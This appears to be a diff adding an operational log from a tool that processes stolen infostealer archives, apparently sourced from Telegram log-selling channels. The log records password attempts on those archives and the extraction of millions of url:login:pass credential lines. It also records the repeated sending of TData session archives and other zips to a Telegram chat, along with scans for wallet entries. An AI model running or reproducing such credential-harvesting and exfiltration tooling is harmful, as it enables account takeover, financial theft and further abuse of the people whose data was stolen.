@@ -1,0 +1,1074 @@
+[2026-06-21 04:52:03] TELEGRAM queued TData1 -> -1003972396261
+[2026-06-21 04:52:05] TELEGRAM SENT TData1.zip -> -1003972396261
+[2026-06-21 04:52:11] TELEGRAM queued TData3 -> -1003972396261
+[2026-06-21 04:52:12] TELEGRAM SENT TData3.zip -> -1003972396261
+[2026-06-21 04:52:38] TELEGRAM queued TData5 -> -1003972396261
+[2026-06-21 04:52:39] TELEGRAM SENT TData5.zip -> -1003972396261
+[2026-06-21 04:58:48] TELEGRAM queued 227228001.zip -> -1003972396261
+[2026-06-21 04:58:49] TELEGRAM SENT 227228001.zip -> -1003972396261
+[2026-06-21 04:59:15] TELEGRAM queued 231626759.zip -> -1003972396261
+[2026-06-21 04:59:15] TELEGRAM SENT 231626759.zip -> -1003972396261
+[2026-06-21 05:01:01] TELEGRAM queued 237571144.zip -> -1003972396261
+[2026-06-21 05:01:01] TELEGRAM SENT 237571144.zip -> -1003972396261
+[2026-06-21 05:01:06] TELEGRAM queued 238468344.zip -> -1003972396261
+[2026-06-21 05:01:07] TELEGRAM SENT 238468344.zip -> -1003972396261
+[2026-06-21 05:01:10] TELEGRAM queued 239175539.zip -> -1003972396261
+[2026-06-21 05:01:11] TELEGRAM SENT 239175539.zip -> -1003972396261
+[2026-06-21 05:01:16] TELEGRAM queued 239176406.zip -> -1003972396261
+[2026-06-21 05:01:16] TELEGRAM SENT 239176406.zip -> -1003972396261
+[2026-06-21 05:01:19] TELEGRAM queued 239224432.zip -> -1003972396261
+[2026-06-21 05:01:20] TELEGRAM SENT 239224432.zip -> -1003972396261
+[2026-06-21 05:01:21] TELEGRAM queued 239383920.zip -> -1003972396261
+[2026-06-21 05:01:24] TELEGRAM SENT 239383920.zip -> -1003972396261
+[2026-06-21 05:01:30] TELEGRAM queued 239958023.zip -> -1003972396261
+[2026-06-21 05:01:31] TELEGRAM SENT 239958023.zip -> -1003972396261
+[2026-06-21 05:01:33] TELEGRAM queued 240114597.zip -> -1003972396261
+[2026-06-21 05:01:34] TELEGRAM SENT 240114597.zip -> -1003972396261
+[2026-06-21 05:01:38] TELEGRAM queued 240454001.zip -> -1003972396261
+[2026-06-21 05:01:39] TELEGRAM SENT 240454001.zip -> -1003972396261
+[2026-06-21 05:02:00] TELEGRAM queued 241208423.zip -> -1003972396261
+[2026-06-21 05:02:00] TELEGRAM SENT 241208423.zip -> -1003972396261
+[2026-06-21 05:02:01] TELEGRAM queued 241216882.zip -> -1003972396261
+[2026-06-21 05:02:03] TELEGRAM queued 241552327.zip -> -1003972396261
+[2026-06-21 05:02:04] TELEGRAM SENT 241216882.zip -> -1003972396261
+[2026-06-21 05:02:07] TELEGRAM queued 241797728.zip -> -1003972396261
+[2026-06-21 05:02:07] TELEGRAM SENT 241552327.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued SS_TDC_ROOT_bf3f73e5200d40ad8af6b6781abbea85.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 227228001.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 231626759.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 237571144.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 238468344.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 239175539.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 239176406.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 239224432.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 239383920.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 239958023.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 240114597.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 240454001.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 241208423.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 241216882.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 241552327.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued 241797728.zip -> -1003972396261
+[2026-06-21 05:02:09] TELEGRAM queued SS_TDC_ROOT_bf3f73e5200d40ad8af6b6781abbea85.zip -> -1003972396261
+[2026-06-21 05:02:11] TELEGRAM SENT 241797728.zip -> -1003972396261
+[2026-06-21 05:02:14] TELEGRAM SENT SS_TDC_ROOT_bf3f73e5200d40ad8af6b6781abbea85.zip -> -1003972396261
+[2026-06-21 05:02:18] TELEGRAM SENT 227228001.zip -> -1003972396261
+[2026-06-21 05:02:21] TELEGRAM SENT 231626759.zip -> -1003972396261
+[2026-06-21 05:02:25] TELEGRAM SENT 237571144.zip -> -1003972396261
+[2026-06-21 05:02:28] TELEGRAM SENT 238468344.zip -> -1003972396261
+[2026-06-21 05:02:32] TELEGRAM SENT 239175539.zip -> -1003972396261
+[2026-06-21 05:02:35] TELEGRAM SENT 239176406.zip -> -1003972396261
+[2026-06-21 05:02:39] TELEGRAM SENT 239224432.zip -> -1003972396261
+[2026-06-21 05:02:42] TELEGRAM SENT 239383920.zip -> -1003972396261
+[2026-06-21 05:02:46] TELEGRAM SENT 239958023.zip -> -1003972396261
+[2026-06-21 05:02:49] TELEGRAM SENT 240114597.zip -> -1003972396261
+[2026-06-21 05:02:53] TELEGRAM SENT 240454001.zip -> -1003972396261
+[2026-06-21 05:02:56] TELEGRAM SENT 241208423.zip -> -1003972396261
+[2026-06-21 05:03:00] TELEGRAM SENT 241216882.zip -> -1003972396261
+[2026-06-21 05:03:04] TELEGRAM SENT 241552327.zip -> -1003972396261
+[2026-06-21 05:03:07] TELEGRAM SENT 241797728.zip -> -1003972396261
+[2026-06-21 05:03:11] TELEGRAM SENT SS_TDC_ROOT_bf3f73e5200d40ad8af6b6781abbea85.zip -> -1003972396261
+[2026-06-20 19:23:50] ERROR | CC archive MTK_FP_v1.1123.0_2014_pass_1111.7z | DataErrorException: Data Error
+[2026-06-20 19:24:08] ERROR | CC archive ADVAUTH.CAB | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:24:08] ERROR | CC archive MSN_AUTH.CAB | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:24:13] ERROR | CC archive ADVAUTH.CAB | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:24:13] ERROR | CC archive MSN_AUTH.CAB | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:24:29] ERROR | CC archive RKT_rockusb-v3.00_2013_pass-1111.7z | DataErrorException: Data Error
+[2026-06-20 19:25:08] ERROR | CC archive MAS_1.7_Password_1234.7z | DataErrorException: Data Error
+[2026-06-20 19:25:24] ERROR | CC archive RKT_rockusb-v3.00_pass-1111 (1).7z | DataErrorException: Data Error
+[2026-06-20 19:25:24] ERROR | CC archive RKT_rockusb-v3.00_pass-1111.7z | DataErrorException: Data Error
+[2026-06-20 19:26:54] ERROR | CC archive T83Rs.7z | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:26:59] ERROR | CC archive esUOxeR.7z | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:27:00] ERROR | CC archive oNtn50n.7z | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:27:53] ERROR | CC archive muauth.cab | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:29:30] ERROR | CC archive N3Es.7z | InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 19:46:59] ERROR | Wallet entry in ⚜️CASHFLOW  Premium LOGS CLOUD⚜️.part01.rar | OverflowException: Arithmetic operation resulted in an overflow.
+[2026-06-20 19:47:55] ERROR | Wallet entry in 2026.06.07 - @LOGS_CENTER_NEW.rar | InvalidFormatException: Unknown Rar Header: 97
+[2026-06-20 20:19:13] TELEGRAM queued TData13.zip -> -1003972396261
+[2026-06-20 20:19:13] TELEGRAM SENT TData13.zip -> -1003972396261
+[2026-06-20 20:33:36] TELEGRAM queued TData22.zip -> -1003972396261
+[2026-06-20 20:33:37] TELEGRAM SENT TData22.zip -> -1003972396261
+[2026-06-20 22:26:18] TELEGRAM queued TData13.zip -> -1003972396261
+[2026-06-20 22:26:18] TELEGRAM queued TData22.zip -> -1003972396261
+[2026-06-20 22:26:19] TELEGRAM SENT TData13.zip -> -1003972396261
+[2026-06-20 22:26:22] TELEGRAM SENT TData22.zip -> -1003972396261
+[2026-06-20 22:31:24] ============================================================
+[2026-06-20 22:31:24] Archive to ULP started | items: 25 | mode: Archives | threads: 5
+[2026-06-20 22:31:24] Skipped 7 secondary multi-volume part(s) (handled via their first volume).
+[2026-06-20 22:31:24] Password pre-check started for 25 archive(s).
+[2026-06-20 22:31:24] PASSWORD @Trident_Cloud_5.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:25] PASSWORD @UP_DAISYCLOUD_CHAMPIONING!_17_JUNE_5714_ON_CHANNEL.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD @VALENCIGA - BUY TRAFFIC LIVE LOGS #553.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD @VALENCIGA - BUY TRAFFIC LIVE LOGS #554.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD ⚜️CASHFLOW  Premium LOGS CLOUD⚜️.part01.rar -> no password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD 2026.06.04 - @LOGS_CENTER_NEW.rar -> no password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD 2026.06.07 - @LOGS_CENTER_NEW.rar -> no password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD 2026.06.13 -- @LOGS_CENTER_NEW.rar -> no password | solid=False type=Rar
+[2026-06-20 22:31:26] PASSWORD 2026.06.17  @LOGS_CENTER_NEW.rar -> no password | solid=False type=Rar
+[2026-06-20 22:31:27] PASSWORD 6220_17.06.2026_@PIXELCLOUD3.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs new v1.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs new v2.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs new v3.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs v1.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs v2 (2).zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse CLoud Logs v2.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse CLoud Logs v3.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:27] PASSWORD ArtHouse Cloud Logs.zip -> no password | solid=False type=Zip
+[2026-06-20 22:31:28] PASSWORD FREE LOGS - @AetherCloud1 (2).rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:28] PASSWORD FREE LOGS - @AetherCloud1 (3).rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:29] PASSWORD FREE LOGS - @AetherCloud1 (4).rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:29] PASSWORD FREE LOGS - @AetherCloud1 (5).rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:29] PASSWORD FREE LOGS - @AetherCloud1.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:30] PASSWORD Slurm Logs (@SlurmLogs).rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:32] PASSWORD ТG - @WichLoveFromR.rar -> settings password | solid=False type=Rar
+[2026-06-20 22:31:32] Password pre-check done: 25/25 openable.
+[2026-06-20 22:31:35] SCAN @Trident_Cloud_5.zip | solid=False type=Zip entries=17483 pwFiles=1077 combos=141664 fails=0 time=00:00:02
+[2026-06-20 22:31:35] @Trident_Cloud_5.zip -> COMPLETED SUCCESSFULLY (85.700 url:login:pass found, 1077 files) [password: no password] [00:00:02]
+[2026-06-20 22:32:43] SCAN @UP_DAISYCLOUD_CHAMPIONING!_17_JUNE_5714_ON_CHANNEL.rar | solid=False type=Rar entries=136599 pwFiles=5313 combos=532213 fails=4 time=00:01:08
+[2026-06-20 22:32:43] @UP_DAISYCLOUD_CHAMPIONING!_17_JUNE_5714_ON_CHANNEL.rar -> COMPLETED SUCCESSFULLY (344.431 url:login:pass found, 5313 files) [password: settings password] [00:01:08]
+[2026-06-20 22:32:55] SCAN @VALENCIGA - BUY TRAFFIC LIVE LOGS #553.rar | solid=False type=Rar entries=21382 pwFiles=993 combos=139653 fails=0 time=00:00:12
+[2026-06-20 22:32:55] @VALENCIGA - BUY TRAFFIC LIVE LOGS #553.rar -> COMPLETED SUCCESSFULLY (105.946 url:login:pass found, 993 files) [password: settings password] [00:00:12]
+[2026-06-20 22:33:10] SCAN @VALENCIGA - BUY TRAFFIC LIVE LOGS #554.rar | solid=False type=Rar entries=26322 pwFiles=1082 combos=155760 fails=0 time=00:00:14
+[2026-06-20 22:33:10] @VALENCIGA - BUY TRAFFIC LIVE LOGS #554.rar -> COMPLETED SUCCESSFULLY (112.634 url:login:pass found, 1082 files) [password: settings password] [00:00:14]
+[2026-06-20 22:35:57] SCAN ⚜️CASHFLOW  Premium LOGS CLOUD⚜️.part01.rar | solid=False type=Rar entries=849097 pwFiles=84119 combos=7353314 fails=0 time=00:02:47
+[2026-06-20 22:35:57] ⚜️CASHFLOW  Premium LOGS CLOUD⚜️.part01.rar -> COMPLETED SUCCESSFULLY (2.794.610 url:login:pass found, 84119 files) [password: no password] [00:02:47]
+[2026-06-20 22:36:05] OPEN FAILED MTK_FP_v1.1123.0_2014_pass_1111.7z -> DataErrorException: Data Error
+[2026-06-20 22:36:06] SCAN 2026.06.04 - @LOGS_CENTER_NEW.rar | solid=False type=Rar entries=48126 pwFiles=1266 combos=122449 fails=0 time=00:00:08
+[2026-06-20 22:36:06] 2026.06.04 - @LOGS_CENTER_NEW.rar -> COMPLETED SUCCESSFULLY (94.621 url:login:pass found, 1266 files) [password: no password] [00:00:08]
+[2026-06-20 22:36:15] OPEN FAILED ADVAUTH.CAB -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:36:15] OPEN FAILED MSN_AUTH.CAB -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:36:16] OPEN FAILED ADVAUTH.CAB -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:36:16] OPEN FAILED MSN_AUTH.CAB -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:36:22] OPEN FAILED RKT_rockusb-v3.00_2013_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-20 22:36:23] SCAN 2026.06.07 - @LOGS_CENTER_NEW.rar | solid=False type=Rar entries=92174 pwFiles=4338 combos=541061 fails=0 time=00:00:16
+[2026-06-20 22:36:23] 2026.06.07 - @LOGS_CENTER_NEW.rar -> COMPLETED SUCCESSFULLY (241.895 url:login:pass found, 4338 files) [password: no password] [00:00:16]
+[2026-06-20 22:36:40] OPEN FAILED MAS_1.7_Password_1234.7z -> DataErrorException: Data Error
+[2026-06-20 22:36:40] SCAN 2026.06.13 -- @LOGS_CENTER_NEW.rar | solid=False type=Rar entries=124160 pwFiles=3643 combos=225237 fails=0 time=00:00:17
+[2026-06-20 22:36:40] 2026.06.13 -- @LOGS_CENTER_NEW.rar -> COMPLETED SUCCESSFULLY (69.977 url:login:pass found, 3643 files) [password: no password] [00:00:17]
+[2026-06-20 22:36:47] OPEN FAILED RKT_rockusb-v3.00_pass-1111 (1).7z -> DataErrorException: Data Error
+[2026-06-20 22:36:48] OPEN FAILED RKT_rockusb-v3.00_pass-1111.7z -> DataErrorException: Data Error
+[2026-06-20 22:36:50] SCAN 2026.06.17  @LOGS_CENTER_NEW.rar | solid=False type=Rar entries=74369 pwFiles=2705 combos=170764 fails=0 time=00:00:10
+[2026-06-20 22:36:50] 2026.06.17  @LOGS_CENTER_NEW.rar -> COMPLETED SUCCESSFULLY (64.099 url:login:pass found, 2705 files) [password: no password] [00:00:10]
+[2026-06-20 22:37:44] SCAN 6220_17.06.2026_@PIXELCLOUD3.rar | solid=False type=Rar entries=99851 pwFiles=4714 combos=211176 fails=0 time=00:00:53
+[2026-06-20 22:37:44] 6220_17.06.2026_@PIXELCLOUD3.rar -> COMPLETED SUCCESSFULLY (36.781 url:login:pass found, 4714 files) [password: settings password] [00:00:53]
+[2026-06-20 22:38:01] SCAN ArtHouse Cloud Logs new v1.zip | solid=False type=Zip entries=95838 pwFiles=10943 combos=1184638 fails=0 time=00:00:17
+[2026-06-20 22:38:01] ArtHouse Cloud Logs new v1.zip -> COMPLETED SUCCESSFULLY (49.131 url:login:pass found, 10943 files) [password: no password] [00:00:17]
+[2026-06-20 22:38:10] SCAN ArtHouse Cloud Logs new v2.zip | solid=False type=Zip entries=58481 pwFiles=6895 combos=618925 fails=0 time=00:00:09
+[2026-06-20 22:38:10] ArtHouse Cloud Logs new v2.zip -> COMPLETED SUCCESSFULLY (26.627 url:login:pass found, 6895 files) [password: no password] [00:00:09]
+[2026-06-20 22:38:12] OPEN FAILED T83Rs.7z -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:38:15] OPEN FAILED esUOxeR.7z -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:38:15] OPEN FAILED oNtn50n.7z -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:38:15] SCAN ArtHouse Cloud Logs new v3.zip | solid=False type=Zip entries=74153 pwFiles=1799 combos=168038 fails=0 time=00:00:04
+[2026-06-20 22:38:15] ArtHouse Cloud Logs new v3.zip -> COMPLETED SUCCESSFULLY (76.973 url:login:pass found, 1799 files) [password: no password] [00:00:04]
+[2026-06-20 22:38:18] SCAN ArtHouse Cloud Logs v1.zip | solid=False type=Zip entries=62229 pwFiles=1701 combos=187052 fails=0 time=00:00:02
+[2026-06-20 22:38:18] ArtHouse Cloud Logs v1.zip -> COMPLETED SUCCESSFULLY (69.322 url:login:pass found, 1701 files) [password: no password] [00:00:03]
+[2026-06-20 22:38:23] SCAN ArtHouse Cloud Logs v2 (2).zip | solid=False type=Zip entries=67465 pwFiles=2355 combos=310952 fails=0 time=00:00:04
+[2026-06-20 22:38:23] ArtHouse Cloud Logs v2 (2).zip -> COMPLETED SUCCESSFULLY (199.260 url:login:pass found, 2355 files) [password: no password] [00:00:04]
+[2026-06-20 22:38:25] SCAN ArtHouse CLoud Logs v2.zip | solid=False type=Zip entries=55993 pwFiles=1818 combos=122330 fails=0 time=00:00:02
+[2026-06-20 22:38:25] ArtHouse CLoud Logs v2.zip -> COMPLETED SUCCESSFULLY (34.174 url:login:pass found, 1818 files) [password: no password] [00:00:02]
+[2026-06-20 22:38:29] OPEN FAILED muauth.cab -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:38:30] SCAN ArtHouse CLoud Logs v3.zip | solid=False type=Zip entries=65205 pwFiles=1987 combos=294617 fails=0 time=00:00:04
+[2026-06-20 22:38:30] ArtHouse CLoud Logs v3.zip -> COMPLETED SUCCESSFULLY (127.957 url:login:pass found, 1987 files) [password: no password] [00:00:04]
+[2026-06-20 22:38:33] SCAN ArtHouse Cloud Logs.zip | solid=False type=Zip entries=53426 pwFiles=1983 combos=257303 fails=0 time=00:00:03
+[2026-06-20 22:38:33] ArtHouse Cloud Logs.zip -> COMPLETED SUCCESSFULLY (89.053 url:login:pass found, 1983 files) [password: no password] [00:00:03]
+[2026-06-20 22:38:47] SCAN FREE LOGS - @AetherCloud1 (2).rar | solid=False type=Rar entries=25664 pwFiles=907 combos=49692 fails=0 time=00:00:13
+[2026-06-20 22:38:47] FREE LOGS - @AetherCloud1 (2).rar -> COMPLETED SUCCESSFULLY (8.711 url:login:pass found, 907 files) [password: settings password] [00:00:13]
+[2026-06-20 22:39:21] SCAN FREE LOGS - @AetherCloud1 (3).rar | solid=False type=Rar entries=32092 pwFiles=2927 combos=365782 fails=4 time=00:00:34
+[2026-06-20 22:39:21] FREE LOGS - @AetherCloud1 (3).rar -> COMPLETED SUCCESSFULLY (116.633 url:login:pass found, 2927 files) [password: settings password] [00:00:34]
+[2026-06-20 22:40:41] SCAN FREE LOGS - @AetherCloud1 (4).rar | solid=False type=Rar entries=58925 pwFiles=7002 combos=760978 fails=0 time=00:01:19
+[2026-06-20 22:40:41] FREE LOGS - @AetherCloud1 (4).rar -> COMPLETED SUCCESSFULLY (381.759 url:login:pass found, 7002 files) [password: settings password] [00:01:19]
+[2026-06-20 22:40:45] SCAN FREE LOGS - @AetherCloud1 (5).rar | solid=False type=Rar entries=5521 pwFiles=237 combos=13217 fails=0 time=00:00:03
+[2026-06-20 22:40:45] FREE LOGS - @AetherCloud1 (5).rar -> COMPLETED SUCCESSFULLY (7.931 url:login:pass found, 237 files) [password: settings password] [00:00:03]
+[2026-06-20 22:41:09] OPEN FAILED tdata.zip -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:41:14] SCAN FREE LOGS - @AetherCloud1.rar | solid=False type=Rar entries=60563 pwFiles=2059 combos=203050 fails=15 time=00:00:29
+[2026-06-20 22:41:14] FREE LOGS - @AetherCloud1.rar -> COMPLETED SUCCESSFULLY (105.244 url:login:pass found, 2059 files) [password: settings password] [00:00:29]
+[2026-06-20 22:41:21] OPEN FAILED N3Es.7z -> InvalidOperationException: Cannot determine compressed stream type. Supported Archive Formats: Zip, Rar, 7Zip, GZip, Tar
+[2026-06-20 22:41:52] SCAN Slurm Logs (@SlurmLogs).rar | solid=False type=Rar entries=74055 pwFiles=2796 combos=210486 fails=10 time=00:00:38
+[2026-06-20 22:41:52] Slurm Logs (@SlurmLogs).rar -> COMPLETED SUCCESSFULLY (68.980 url:login:pass found, 2796 files) [password: settings password] [00:00:38]
+[2026-06-20 22:42:23] SCAN ТG - @WichLoveFromR.rar | solid=False type=Rar entries=62308 pwFiles=2069 combos=146813 fails=8 time=00:00:30
+[2026-06-20 22:42:23] ТG - @WichLoveFromR.rar -> COMPLETED SUCCESSFULLY (32.990 url:login:pass found, 2069 files) [password: settings password] [00:00:30]
+[2026-06-20 22:42:25] Archive to ULP finished | unique lines: 5345439 | failed: 0 | elapsed: 00:11:01
+[2026-06-21 03:49:12] ============================================================
+[2026-06-21 03:49:12] Archive to ULP started | items: 111 | mode: Archives | threads: 5
+[2026-06-21 03:49:12] Password pre-check started for 111 archive(s).
+[2026-06-21 03:49:12] PASSWORD @beetraffic 1603 MIX 07-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 03:49:12] PASSWORD @beetraffic 1609 MIX 14-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 03:49:25] PASSWORD @beetraffic 3000 MIX 17-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:25] PASSWORD @beetraffic 3000 MIX 20-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:25] PASSWORD @beetraffic 4000 MIX 15-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:28] PASSWORD @beetraffic 4500 MIX 02-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:28] PASSWORD @beetraffic 5000 MIX 08-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:28] PASSWORD @beetraffic 5555 MIX 11-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:28] PASSWORD @beetraffic 6000 04-06-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:28] PASSWORD @beetraffic_cloud 1420 MIX 07-05-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:42] PASSWORD @beetraffic_cloud 1500 MIX 12-05-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:42] PASSWORD @beetraffic_cloud 1808 MIX 01-05-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:42] PASSWORD @beetraffic_cloud 1972 MIX 28-04-2026.zip -> NONE WORKED (will be skipped) | solid=False type=Zip
+[2026-06-21 03:49:42] PASSWORD @beetraffic_cloud 4141 MIX 21-04-2026.zip -> settings password | solid=False type=Zip
+[2026-06-21 03:49:44] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (2).rar -> settings password | solid=False type=Rar
+[2026-06-21 03:49:44] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (3).rar -> settings password | solid=False type=Rar
+[2026-06-21 03:49:44] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️ (4).rar -> settings password | solid=False type=Rar
+[2026-06-21 03:49:44] PASSWORD ⚡️Luffich&Cloud FREE LOGS⚡️.rar -> settings password | solid=False type=Rar
+[2026-06-21 03:49:45] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️ (2).rar -> no password | solid=False type=Rar
+[2026-06-21 03:49:45] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️ (3).rar -> no password | solid=False type=Rar
+[2026-06-21 03:49:45] PASSWORD ⚡️Luffich&Cloud FREE TXT⚡️.rar -> no password | solid=False type=Rar
+[2026-06-21 03:49:45] PASSWORD LogsDiller Cloud_ 224_#64.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_ 473_#63.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_211_#26.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_308_#54.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_339_#137.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_341_#36.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_401_#47.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_420_#143.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_421_#144.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_433_#150.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_441_#149.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_451_#59.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_493_#61.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_493_#119.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_494_#142.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:46] PASSWORD LogsDiller Cloud_495_#31.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:47] PASSWORD LogsDiller Cloud_502_#79.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:47] PASSWORD LogsDiller Cloud_511_#56.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:47] PASSWORD LogsDiller Cloud_513_#73.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_521_#68.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_526_#35.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_527_#140.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_530_#66.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_535_#151.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_537_#146.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:48] PASSWORD LogsDiller Cloud_541_#27.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_545_#42.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_578_#50.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_591_#39.zip -> no password | solid=False type=Zip
+[2026-06-21 03:49:49] PASSWORD LogsDiller Cloud_612_#60.zip -> no password | solid=False type=Zip
